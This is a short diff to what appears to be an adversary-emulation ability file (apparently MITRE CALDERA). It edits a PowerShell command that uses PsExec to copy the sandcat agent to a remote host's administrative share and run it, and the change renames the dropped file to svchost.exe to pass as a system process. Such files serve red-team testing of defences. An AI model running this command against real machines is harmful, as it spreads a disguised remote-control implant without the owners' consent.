@@ -11,5 +11,5 @@
      windows:
        psh:
          command: |
-           C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f sandcat.exe \\#{remote.host.ip}\C$\Users\Public\
+           C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f sandcat.exe \\#{remote.host.ip}\C$\Users\Public\svchost.exe
          payload: sandcat.go
